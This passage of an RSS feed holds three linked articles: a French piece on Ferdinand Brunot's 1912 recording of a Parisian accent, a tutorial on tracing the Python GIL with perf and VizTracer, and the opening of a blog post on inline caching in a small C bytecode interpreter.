<h2>Le parler d'un pur "Parisien de Paris"</h2>
<p>Le linguiste Ferdinand Brunot, fondateur des "Archives de la parole"&nbsp;en 1911, est l'un des rares universitaires de son temps à s'intéresser à l'enregistrement du français parlé&nbsp;"commun". Pour lui, le "parler parisien" est une forme de dialecte dont il faut garder la trace. Chaque quartier de la capitale est censé présenter ses spécificités linguistiques&nbsp;: on ne parle pas à Montrouge comme à Montmartre. Or pour <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, responsable du service des documents sonores à la BnF, "<em>ce 'dialecte' parisien renvoie lui-même à l’un des plus grands mythes de la linguistique romane parisienne de la fin du XIXe siècle, à savoir le "françien", un supposé dialecte d’Île-de-France dans lequel le français trouverait sa seule origine. On est là au cœur de la construction jacobine de la langue française mise en œuvre après 1870, opposant définitivement français et autres idiomes parlés sur le territoire.</em>"</p>
<p><em>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</em></p>


<p>- Vous êtes vraiment, vous monsieur, un Parisien de Paris&nbsp;?&nbsp;</p>
<p><em>-</em> Je suis né à Paris même, boulevard Sébastopol et j’ai monté du côté de Montrouge, rue Daguerre. Ensuite, j’ai été avenue d’Orléans. J’ai travaillé dans le quartier constamment. Je ne l’ai jamais quitté du reste.&nbsp;</p>
<p>- Et vous êtes exclusivement tapissier, alors&nbsp;?&nbsp;</p>
<p>- Absolument. (...) et je travaille pour le client personnel (...)</p>
<p>- Vous êtes exclusivement dans la clientèle bourgeoise&nbsp;?&nbsp;</p>
<p>- Oui, monsieur.</p>
<p>- Il y a eu beaucoup d’installations de ce côté-là, ce doit être un bon métier&nbsp;?</p>
<p><em>-</em> Ah le quartier a beaucoup gagné. Nous avons depuis quelques années travaillé admirablement.</p>
<p>- J’ai entendu dire que vous n’étiez pas payé très régulièrement...</p>
<p>- Oh vous savez, le 14e est tout à fait spécial. Nous avons de bons clients, de bons bourgeois, et puis régulièrement, on hésite à donner une affaire... Mais quant au règlement, jamais nous ne perdons quoi que ce soit.&nbsp;</p>
<p>- On m’avait dit au contraire que rue Alphonse Daudet, il y avait une clientèle peu recommandable...</p>
<p>- Ah dame ! Ça, je m’en réjouis bien !</p>
<h2>Entendre sa propre voix</h2>
<p>Ce document est unique à plus d'un titre&nbsp;: c’est aussi la première fois qu’on entend quelqu’un réagir à ses propos, à sa voix. &nbsp;Dans la foulée de l’interview, Louis Ligabue s’écoute, et s’étonne, toujours en dialoguant avec le linguiste Ferdinand Brunot. <a target="_blank" rel="noopener" href="https://gallica.bnf.fr/blog/11052020/quand-un-parisien-entend-pour-la-premiere-fois-le-son-de-sa-voix?mode=desktop">Pascal Cordereix</a>, spécialiste du fonds sonore ancien à la Bibliothèque nationale de France (BnF)&nbsp;: "<em>On connaît beaucoup de récits écrits d’un enregistrement et de la surprise du locuteur s’écoutant parler. Mais à notre connaissance, Ferdinand Brunot est le seul, avant longtemps, à avoir l’idée de graver ainsi sur disque les réactions du témoin à l’écoute de sa propre voix.</em>"</p>
<p><strong>Ferdinand Brunot interviewe Louis Ligabue en 1912&nbsp;:&nbsp;</strong></p>
<p>- Eh bien, vous avez entendu ce que vous avez dit. Vous êtes-vous reconnu&nbsp;?&nbsp;</p>
<p>- Oui, parfaitement monsieur !</p>
<p>- N’est-ce pas que c’est bien votre voix&nbsp;?&nbsp;</p>
<p>- C’est parfait, parfait, c’est même très très curieux ! C’est très drôle, il me semble même que c’est extraordinaire que j’aie une voix si traînarde, jamais je ne l’aurais cru ! On ne s’entend pas, absolument !&nbsp;</p>
<p>- Vous n’avez pas la voix traînarde, vous avez tout simplement l’accent de Paris, c’est justement ça que je veux enregistrer.&nbsp;</p>
<p>- Ah ça aujourd'hui j’en suis convaincu, bien des gens m’ont dit des fois&nbsp;: “Comme il traîne ce garçon dans sa conversation”. Ben, je disais non, pourtant, il me semble que c’est tout naturel&nbsp;; mais alors là, vous savez, j’ai un accent presque d’La Villette on dirait…</p>
<p>- La Villette&nbsp;? Ne croyez-vous pas qu’il y a une grande différence justement entre l’accent de La Villette et le vôtre&nbsp;?</p>
<p>- Ah peut-être, je ne sais pas…</p>
<p>- Vous qui êtes de Paris, est-ce que vous ne reconnaissez pas justement quelqu’un qui est de nos arrondissements&nbsp;?</p>
<p>- Ah absolument, si, il y a réellement des différences.</p>
<p>- Quelqu’un qui s’est beaucoup occupé de ça me disait par exemple qu’il reconnaissait du premier coup un habitant du 14e et un habitant de Montmartre.</p>
<p>- Ah peut-être, mais enfin, il me semble que c’est une étude assez sérieuse.</p>
<p>- Oui, il y a des gars qui imitent ça étonnamment et à volonté vous savez, ils se transforment en gens de Montparnasse, ou en gens de Montmartre comme ils veulent.</p>
<p>- Ah oui, on voit ça dans les revues, là, dans les concerts, là&nbsp;; on a des types spéciaux là-dessus.</p>
<p>- Oui. Est-ce que dans la rue de la Gaîté, là, il y a des gens qui imitent justement l’accent du quartier&nbsp;?</p>
<p>- Ah y en a, y en a. Mais alors, ça devient peut-être un peu en exagération. Tandis que là, moi, je cause naturellement, et quand j’écoute, il me semble que j’exagère… Je suis bien content, vous savez, d’avoir jugé et ça m’a bien intéressé !</p>
<p>- Et bien je vous remercie de vous être prêté à l’expérience.</p>
<p>- De rien.</p>
<h2>Les Archives de la parole à découvrir sur Gallica</h2>
<p>Archive conservée à la Bibliothèque nationale de France. Merci au service Son du département de l’Audiovisuel, BnF et au Service de la coopération numérique et de Gallica, BnF. Archives de la Parole, conservation&nbsp;: BnF, Département de l’Audiovisuel, service Son.</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-ferdinand-brunot-1911-1914">Les Archives de la parole, 1911-1914</a></li>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-jean-poirot-enregistrements-la-sorbonne">Les Archives de la parole, 1920-1924</a></li>
<li><a target="_blank" rel="noopener" href="https://gallica.bnf.fr/html/und/enregistrements-sonores/archives-de-la-parole-musee-de-la-parole-et-du-geste-hubert-pernot-1924-1930">Les Archives de la parole, 1924-1930</a></li>
</ul>



    </div></div>]]>
            </description>
            <link>https://www.franceculture.fr/sciences-du-langage/archive-exceptionnelle-ecoutez-laccent-parisien-en-1912</link>
            <guid isPermaLink="false">hacker-news-small-sites-25775091</guid>
            <pubDate>Thu, 14 Jan 2021 11:26:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tracing and visualizing the Python GIL with perf and VizTracer]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25774945">thread link</a>) | @maartenbreddels
<br/>
January 14, 2021 | https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html | <a href="https://web.archive.org/web/*/https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<div>

<p>There are plenty of articles explaining why the Python GIL (The Global Interpreter Lock) exists<sup id="fnref-1"><a href="#fn-1">1</a></sup>, and why it is there. The TLDR version is: the GIL prevents multithreaded pure Python code from using multiple CPU cores.</p>
<p>However, in <a href="https://vaex.io/">Vaex</a> we execute most of the CPU intensive parts in C (C++) code, where we release the GIL. This is a common practice in high-performance Python libraries, where Python acts merely as a high-level glue.</p>
<p>However, the GIL needs to be released explicitly, and this is the responsibility of the programmer and might be forgotten, leading to suboptimal use of your machine.</p>
<p>I recently had this issue in <a href="https://github.com/vaexio/vaex/pull/1114">Vaex</a> where I simply forgot to release the GIL and found a similar issue in <a href="https://github.com/apache/arrow/pull/7756">Apache Arrow</a><sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p>
<p>Also, when running on 64 cores, I sometimes see a performance in Vaex that I am not happy with. It might be using 4000% CPU, instead of 6400% CPU, which is something I am not happy with. Instead of blindly pulling some levers to inspect the effect, I want to understand what is happening, and if the GIL is the problem, why, and where is it holding Vaex down.</p>


</div>
</div>
</div><div>
<div>
<div>

<p>I'm planning to write a series of articles explaining some tools and techniques available for profiling/tracing Python together with native extensions, and how these tools can be glued together, to analyze and visualize what Python is doing, and when the GIL it taken or dropped.</p>
<p>I hope this leads to improvement of tracing, profiling, and other performance tooling in the Python ecosystem, and the performance of the whole Python ecosystem.</p>

<h2 id="Linux">
Linux<a href="#Linux"> </a>
</h2>
<p>Get access to a Linux machine, and make sure you have root privileges (sudo is fine), or ask your sysadmin to execute some of these commands for you. For the rest of the document, we only run as user.</p>
<h2 id="Perf">
Perf<a href="#Perf"> </a>
</h2>
<p>Make sure you have perf installed, e.g. on Ubuntu:</p>

<pre><code>$ sudo yum install perf</code></pre>
<h2 id="Kernel-configuration">
Kernel configuration<a href="#Kernel-configuration"> </a>
</h2>
<p>To enable running it as a user:</p>

<pre><code># Enable users to run perf (use at own risk)
$ sudo sysctl kernel.perf_event_paranoid=-1

# Enable users to see schedule trace events:
$ sudo mount -o remount,mode=755 /sys/kernel/debug
$ sudo mount -o remount,mode=755 /sys/kernel/debug/tracing</code></pre>
<h2 id="Python-packages">
Python packages<a href="#Python-packages"> </a>
</h2>
<p>We will make use of <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> and <a href="https://github.com/maartenbreddels/per4m">per4m</a></p>

<pre><code>$ pip install "viztracer&gt;=0.11.2" "per4m&gt;=0.1,&lt;0.2"</code></pre>

</div>
</div>
</div><div>
<div>
<div>

<p>There is no way to get the GIL state in Python <sup id="fnref-3"><a href="#fn-3">1</a></sup> since there is no API for this. We can track it from the kernel, and the right tool for this under Linux is <strong>perf</strong>.</p>
<p>Using the linux perf tool (aka perf_events), we can listen to the state changes for processes/threads (we only care about sleeping and running), and log them. Although perf may look scary, it is a powerful tool. If you want to know a bit more about perf, I recommend reading <a href="https://jvns.ca/blog/2018/04/16/new-perf-zine/">Julia Evans' zine on perf</a> or <a href="http://www.brendangregg.com/perf.html">go through Brendan Gregg's website</a>.</p>
<p>To build our intuition, we will first run perf on a <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example0.py">very trivial program</a>:</p>


</div>
</div>
</div><div>
<div>
<div>
<p>We listen to just a few events to keep the noise down (note the use of wildcards):</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork \
        -e 'sched:sched_wak*' -- python -m per4m.example0
[ perf record: Woken up 2 times to write data ]
[ perf record: Captured and wrote 0,032 MB perf.data (33 samples) ]</code></pre>
<p>And use the <code>perf script</code> command to write human/parsable output.</p>

<pre><code>$ perf script
        :3040108 3040108 [032] 5563910.979408:                sched:sched_waking: comm=perf pid=3040114 prio=120 target_cpu=031
        :3040108 3040108 [032] 5563910.979431:                sched:sched_wakeup: comm=perf pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995616:                sched:sched_waking: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995618:                sched:sched_wakeup: comm=kworker/31:1 pid=2502104 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995621:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995622:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563910.995624:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R+ ==&gt; next_comm=kworker/31:1 next_pid=2502104 next_prio=120
          python 3040114 [031] 5563911.003612:                sched:sched_waking: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.003614:                sched:sched_wakeup: comm=kworker/32:1 pid=2467833 prio=120 target_cpu=032
          python 3040114 [031] 5563911.083609:                sched:sched_waking: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083612:                sched:sched_wakeup: comm=ksoftirqd/31 pid=198 prio=120 target_cpu=031
          python 3040114 [031] 5563911.083613:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=R ==&gt; next_comm=ksoftirqd/31 next_pid=198 next_prio=120
          python 3040114 [031] 5563911.108984:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.109059:                sched:sched_waking: comm=node pid=2446812 prio=120 target_cpu=045
          python 3040114 [031] 5563911.112250:          sched:sched_process_fork: comm=python pid=3040114 child_comm=python child_pid=3040116
          python 3040114 [031] 5563911.112260:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112262:            sched:sched_wakeup_new: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040114 [031] 5563911.112273:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112418:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112450:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112473: sched:sched_wake_idle_without_ipi: cpu=31
         swapper     0 [031] 5563911.112476:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112485:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
          python 3040116 [037] 5563911.112485:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112489:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563911.112496:                sched:sched_switch: prev_comm=python prev_pid=3040116 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/37 next_pid=0 next_prio=120
         swapper     0 [031] 5563911.112497:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120
         swapper     0 [037] 5563912.113490:                sched:sched_waking: comm=python pid=3040116 prio=120 target_cpu=037
         swapper     0 [037] 5563912.113529:                sched:sched_wakeup: comm=python pid=3040116 prio=120 target_cpu=037
          python 3040116 [037] 5563912.113595:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
          python 3040116 [037] 5563912.113620:                sched:sched_waking: comm=python pid=3040114 prio=120 target_cpu=031
         swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></pre>

</div>
</div>
</div><div>
<div>
<div>
<p>Take a moment to digest the output. I can see a few things. Looking at the 4th column (time in seconds), we can see where the program slept (it skips 1 second). Here we see that we enter the sleeping state with a line like:</p>
<p><code>python 3040114 [031] 5563911.112513:                sched:sched_switch: prev_comm=python prev_pid=3040114 prev_prio=120 prev_state=S ==&gt; next_comm=swapper/31 next_pid=0 next_prio=120</code></p>
<p>This means the kernel changed the state of the Python thread to <code>S</code> (=sleeping) state.</p>
<p>A full second later, we see it being woken up:</p>
<p><code>swapper     0 [031] 5563912.113697:                sched:sched_wakeup: comm=python pid=3040114 prio=120 target_cpu=031</code></p>
<p>Of course, you need to build some tooling around this, to really see what is happening. But one can imagine this output can be easily parsed and this is what <a href="https://github.com/maartenbreddels/per4m/">per4m</a> does. However, before we go there, I'd first like to visualize the flow of a slightly more advanced program using <a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a>.</p>

</div>
</div>
</div><div>
<div>
<div>

<p><a href="https://github.com/gaogaotiantian/viztracer/">VizTracer</a> is a Python tracer that can visualize what your program does in the browser. Let us run it on a slightly <a href="https://github.com/maartenbreddels/per4m/blob/master/per4m/example1.py">more advanced example</a> to see what it looks like.</p>

</div>
</div>
</div><div>
<div>
<div>
<p>Running viztracer gives output like:</p>

<pre><code>$ viztracer -o example1.html --ignore_frozen -m per4m.example1
Loading finish                                        
Saving report to /home/maartenbreddels/github/maartenbreddels/per4m/example1.html ...
Dumping trace data to json, total entries: 94, estimated json file size: 11.0KiB
Generating HTML report
Report saved.</code></pre>
<p>And the HTML should render as:
<img src="https://www.maartenbreddels.com/images/copied_from_nb/per4m/example1.png" alt="image.png"></p>
<p>From this, it seems that <code>some_computation</code> seem to be executed in parallel (twice), while in fact, we know the GIL is preventing that. So what is really going on?</p>

</div>
</div>
</div><div>
<div>
<div>

<p>Let us run <code>perf</code> on this, similarly to what we did to example0.py. However, we add the argument <code>-k CLOCK_MONOTONIC</code> so that we use <a href="https://github.com/gaogaotiantian/viztracer/blob/3321ba4024afe5623f938a601d7f7db3b08f534d/src/viztracer/modules/snaptrace.c#L91">the same clock as VizTracer</a> and ask VizTracer to generate a JSON, instead of an HTML file:</p>

<pre><code>$ perf record -e sched:sched_switch  -e sched:sched_process_fork -e 'sched:sched_wak*' \
   -k CLOCK_MONOTONIC  -- viztracer -o viztracer1.json --ignore_frozen -m per4m.example1</code></pre>
<p>Then …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html">https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</a></em></p>]]>
            </description>
            <link>https://www.maartenbreddels.com/perf/jupyter/python/tracing/gil/2021/01/14/Tracing-the-Python-GIL.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25774945</guid>
            <pubDate>Thu, 14 Jan 2021 11:06:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Inline Caching]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25773724">thread link</a>) | @todsacerdoti
<br/>
January 14, 2021 | https://bernsteinbear.com/blog/inline-caching/ | <a href="https://web.archive.org/web/*/https://bernsteinbear.com/blog/inline-caching/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Inline caching is a popular technique for runtime optimization. It was first
introduced in 1984 in Deutsch &amp; Schiffman’s paper <a href="http://web.cs.ucla.edu/~palsberg/course/cs232/papers/DeutschSchiffman-popl84.pdf">Efficient implementation
of the smalltalk-80 system [PDF]</a> but has had a long-lasting legacy in
today’s dynamic language implementations. Runtimes like the Hotspot JVM, V8,
and SpiderMonkey use it to improve the performance of code written for those
virtual machines.</p>

<p>In this blog post, I will attempt to distill the essence of inline caching
using a small and relatively useless bytecode interpreter built solely for this
blog post. The caching strategy in this demo is a technique similar to the
ideas from <a href="http://www.complang.tuwien.ac.at/kps09/pdfs/brunthaler.pdf">Inline Caching meets Quickening [PDF]</a> in that it
caches function pointers instead of making use of a JIT compiler.</p>

<h2 id="background">Background</h2>

<p>In many compiled programming languages like C and C++, types and attribute
locations are known at compile time. This makes code like the following fast:</p>

<div><div><pre><code><span>#include "foo.h"
</span>
<span>Foo</span> <span>do_add</span><span>(</span><span>Foo</span> <span>left</span><span>,</span> <span>Foo</span> <span>right</span><span>)</span> <span>{</span>
  <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>The compiler knows precisely what type <code>left</code> and <code>right</code> are (it’s <code>Foo</code>) and
also where the method <code>add</code> is in the executable. If the implementation is in
the header file, it may even be inlined and <code>do_add</code> may be optimized to a
single instruction. Check out the assembly from <code>objdump</code>:</p>

<div><div><pre><code>0000000000401160 &lt;_Z6do_add3FooS_&gt;:
  401160:	48 83 ec 18          	sub    $0x18,%rsp
  401164:	89 7c 24 0c          	mov    %edi,0xc(%rsp)
  401168:	48 8d 7c 24 0c       	lea    0xc(%rsp),%rdi
  40116d:	e8 0e 00 00 00       	callq  401180 &lt;_ZN3Foo3addES_&gt;
  401172:	48 83 c4 18          	add    $0x18,%rsp
  401176:	c3                   	retq   
</code></pre></div></div>

<p>All it does is save the parameters to the stack, call <code>Foo::add</code>, and then
restore the stack.</p>

<p>In more dynamic programming languages, it is often impossible to determine at
runtime startup what type any given variable binding has. We’ll use Python as an
example to illustrate how dynamism makes this tricky, but this constraint is
broadly applicable to Ruby, JavaScript, etc.</p>

<p>Consider the following Python snippet:</p>

<div><div><pre><code><span>def</span> <span>do_add</span><span>(</span><span>left</span><span>,</span> <span>right</span><span>):</span>
    <span>return</span> <span>left</span><span>.</span><span>add</span><span>(</span><span>right</span><span>)</span>
</code></pre></div></div>

<p>Due to Python’s various dynamic features, the compiler cannot in general know
what type <code>value</code> is and therefore what code to run when reading <code>left.add</code>.
This program will be compiled down to a couple Python bytecode instructions
that do a very generic <code>LOAD_METHOD</code>/<code>CALL_METHOD</code> operation:</p>

<div><div><pre><code>&gt;&gt;&gt; import dis
&gt;&gt;&gt; dis.dis("""
... def do_add(left, right):
...     return left.add(right)
... """)
[snip]
Disassembly of &lt;code object do_add at 0x7f0b40cf49d0, file "&lt;dis&gt;", line 2&gt;:
  3           0 LOAD_FAST                0 (left)
              2 LOAD_METHOD              0 (add)
              4 LOAD_FAST                1 (right)
              6 CALL_METHOD              1
              8 RETURN_VALUE

&gt;&gt;&gt; 
</code></pre></div></div>

<p>This <code>LOAD_METHOD</code> Python bytecode instruction is unlike the x86 <code>mov</code>
instruction in that <code>LOAD_METHOD</code> is not given an offset into <code>left</code>, but
instead is given the name <code>"add"</code>. It has to go and figure out how to read
<code>add</code> from <code>left</code>’s type — which could change from call to call.</p>

<p>In fact, even if the parameters were typed (which is a new feature in Python
3), the same code would be generated. Writing <code>left: Foo</code> means that <code>left</code> is a
<code>Foo</code> <em>or</em> a subclass.</p>

<p>This is not a simple process like “fetch the attribute at the given offset
specified by the type”. The runtime has to find out what kind of object <code>add</code>
is. Maybe it’s just a function, or maybe it’s a <code>property</code>, or maybe it’s some
custom descriptor protocol thing. There’s no way to just turn this into a
<code>mov</code>!</p>

<p>… or is there?</p>

<h2 id="runtime-type-information">Runtime type information</h2>

<p>Though dynamic runtimes do not know ahead of time what types variables have at
any given opcode, they do eventually find out <em>when the code is run</em>. The first
time someone calls <code>do_add</code>, <code>LOAD_METHOD</code> will go and look up the type of
<code>left</code>. It will use it to look up the attribute <code>add</code> and then throw the type
information away. But the second time someone calls <code>do_add</code>, the same thing
will happen. Why don’t runtimes store this information about the type and the
method and save the lookup work?</p>

<p>The thinking is “well, <code>left</code> could be any type of object — best not make any
assumptions about it.” While this is <em>technically</em> true, Deutsch &amp;
Schiffman find that “at a given point in code, the receiver is often the same
class as the receiver at the same point when the code was last executed”.</p>

<blockquote>
  <p><strong>Note:</strong> By <em>receiver</em>, they mean the thing from which the attribute is
being loaded. This is some Object-Oriented Programming terminology.</p>
</blockquote>

<p>This is huge. This means that, even in this sea of dynamic behavior, humans
actually are not all that creative and tend to write functions that see only a
handful of types at a given location.</p>

<p>The Smalltalk-80 paper describes a runtime that takes advantage of this by
adding “inline caches” to functions. These inline caches keep track of variable
types seen at each point in the code, so that the runtime can make optimization
decisions with that information.</p>

<p>Let’s take a look at how this could work in practice.</p>

<h2 id="a-small-example">A small example</h2>

<p>I put together a <a href="https://github.com/tekknolagi/icdemo">small stack machine</a> with only a few operations. There
are very minimal features to avoid distracting from the main focus: inline
caching. Extending this example would be an excellent exercise.</p>

<h3 id="objects-and-types">Objects and types</h3>

<p>The design of this runtime involves two types of objects (<code>int</code>s and <code>str</code>s).
Objects are implemented as a tagged union, but for the purposes of this blog
post the representation does not matter very much.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kInt</span><span>,</span>
  <span>kStr</span><span>,</span>
<span>}</span> <span>ObjectType</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>type</span><span>;</span>
  <span>union</span> <span>{</span>
    <span>const</span> <span>char</span> <span>*</span><span>str_value</span><span>;</span>
    <span>int</span> <span>int_value</span><span>;</span>
  <span>};</span>
<span>}</span> <span>Object</span><span>;</span>
</code></pre></div></div>

<p>These types have methods on them, such as <code>add</code> and <code>print</code>. Method names are
represented with an enum (<code>Symbol</code>) though strings would work just as well.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kAdd</span><span>,</span>
  <span>kPrint</span><span>,</span>

  <span>kUnknownSymbol</span> <span>=</span> <span>kPrint</span> <span>+</span> <span>1</span><span>,</span>
<span>}</span> <span>Symbol</span><span>;</span>
</code></pre></div></div>

<p>The representation of type information isn’t super important. Just know that
there is a function called <code>lookup_method</code> and that it is very slow. Eventually
we’ll want to cache its result.</p>

<div><div><pre><code><span>Method</span> <span>lookup_method</span><span>(</span><span>ObjectType</span> <span>type</span><span>,</span> <span>Symbol</span> <span>name</span><span>);</span>
</code></pre></div></div>

<p>Let’s see how we use these <code>lookup_method</code> in the interpreter.</p>

<h3 id="interpreter">Interpreter</h3>

<p>There’s no way to call these methods directly. For the purposes of this demo,
the only way to call these methods is through purpose-built opcodes. For
example, the opcode <code>ADD</code> takes two arguments. It looks up <code>kAdd</code> on the left
hand side and calls it. <code>PRINT</code> is similar.</p>

<p>There are only two other opcodes, <code>ARG</code> and <code>HALT</code>.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>// Load a value from the arguments array at index `arg'.</span>
  <span>ARG</span><span>,</span>
  <span>// Add stack[-2] + stack[-1].</span>
  <span>ADD</span><span>,</span>
  <span>// Pop the top of the stack and print it.</span>
  <span>PRINT</span><span>,</span>
  <span>// Halt the machine.</span>
  <span>HALT</span><span>,</span>
<span>}</span> <span>Opcode</span><span>;</span>
</code></pre></div></div>
<p>Bytecode is represented by a series of opcode/argument pairs, each taking up
one byte. Only <code>ARG</code> needs an argument; the other instructions ignore theirs.</p>

<p>Let’s look at a sample program.</p>

<div><div><pre><code><span>byte</span> <span>bytecode</span><span>[]</span> <span>=</span> <span>{</span><span>/*0:*/</span> <span>ARG</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*2:*/</span> <span>ARG</span><span>,</span>   <span>1</span><span>,</span>
                   <span>/*4:*/</span> <span>ADD</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*6:*/</span> <span>PRINT</span><span>,</span> <span>0</span><span>,</span>
                   <span>/*8:*/</span> <span>HALT</span><span>,</span>  <span>0</span><span>};</span>
</code></pre></div></div>

<p>This program takes its two arguments, adds them together, prints the result,
and then halts the interpreter.</p>

<p>You may wonder, “how is it that there is an instruction for loading arguments
but no call instruction?” Well, the interpreter does not support calls. There
is only a top-level function, <code>eval_code</code>. It takes an object, evaluates its
bytecode with the given arguments, and returns. Extending the interpreter to
support function calls would be another good exercise.</p>

<p>The interpreter implementation is a fairly straightforward <code>switch</code> statement.
Notice that it takes a representation of a function-like thing (<code>Code</code>) and an
array of arguments. <code>nargs</code> is only used for bounds checking.</p>

<div><div><pre><code><span>typedef</span> <span>unsigned</span> <span>char</span> <span>byte</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>key</span><span>;</span>
  <span>Method</span> <span>value</span><span>;</span>
<span>}</span> <span>CachedValue</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>// Array of `num_opcodes' (op, arg) pairs (total size `num_opcodes' * 2).</span>
  <span>byte</span> <span>*</span><span>bytecode</span><span>;</span>
  <span>int</span> <span>num_opcodes</span><span>;</span>
  <span>// Array of `num_opcodes' elements.</span>
  <span>CachedValue</span> <span>*</span><span>caches</span><span>;</span>
<span>}</span> <span>Code</span><span>;</span>

<span>static</span> <span>unsigned</span> <span>kBytecodeSize</span> <span>=</span> <span>2</span><span>;</span>

<span>void</span> <span>eval_code_uncached</span><span>(</span><span>Code</span> <span>*</span><span>code</span><span>,</span> <span>Object</span> <span>*</span><span>args</span><span>,</span> <span>int</span> <span>nargs</span><span>)</span> <span>{</span>
  <span>int</span> <span>pc</span> <span>=</span> <span>0</span><span>;</span>
<span>#define STACK_SIZE 100
</span>  <span>Object</span> <span>stack_array</span><span>[</span><span>STACK_SIZE</span><span>];</span>
  <span>Object</span> <span>*</span><span>stack</span> <span>=</span> <span>stack_array</span><span>;</span>
<span>#define PUSH(x) *stack++ = (x)
#define POP() *--stack
</span>  <span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>Opcode</span> <span>op</span> <span>=</span> <span>code</span><span>-&gt;</span><span>bytecode</span><span>[</span><span>pc</span><span>];</span>
    <span>byte</span> <span>arg</span> <span>=</span> <span>code</span><span>-&gt;</span><span>bytecode</span><span>[</span><span>pc</span> <span>+</span> <span>1</span><span>];</span>
    <span>switch</span> <span>(</span><span>op</span><span>)</span> <span>{</span>
      <span>case</span> <span>ARG</span><span>:</span>
        <span>CHECK</span><span>(</span><span>arg</span> <span>&lt;</span> <span>nargs</span> <span>&amp;&amp;</span> <span>"out of bounds arg"</span><span>);</span>
        <span>PUSH</span><span>(</span><span>args</span><span>[</span><span>arg</span><span>]);</span>
        <span>break</span><span>;</span>
      <span>case</span> <span>ADD</span><span>:</span> <span>{</span>
        <span>Object</span> <span>right</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Object</span> <span>left</span> <span>=</span> <span>POP</span><span>();</span>
        <span>Method</span> <span>method</span> <span>=</span> <span>lookup_method</span><span>(</span><span>left</span><span>.</span><span>type</span><span>,</span> <span>kAdd</span><span>);</span>
        <span>Object</span> <span>result</span> <span>=</span> <span>(</span><span>*</span><span>method</span><span>)(</span><span>left</span><span>,</span> <span>right</span><span>);</span>
